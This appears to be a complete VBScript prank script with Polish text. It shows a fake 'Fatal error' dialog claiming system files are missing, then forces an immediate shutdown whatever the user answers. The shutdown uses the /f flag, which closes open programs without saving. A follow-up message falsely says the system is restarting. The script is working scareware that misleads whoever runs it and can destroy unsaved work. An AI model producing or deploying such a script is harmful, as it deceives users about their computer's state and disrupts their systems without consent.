Do
odp = MsgBox("Na komputerze brakuje niektórych plików systemu. Trzeba zrestartować system operacyjny aby je przywrócić. Kontynuować?", 16+vbYesNo, "Fatalny błąd")
if odp =x then
else
Do
Set oWS = WScript.CreateObject("WScript.Shell")
oWS.Run "\Windows\System32\shutdown.exe /s /t 00 /f"
msgbox"Trwa restartowanie systemu operacyjnego. Proszę czekać.", 16+vbYesNo, "Zamykanie..."
wscript.quit
Loop
end if
Loop
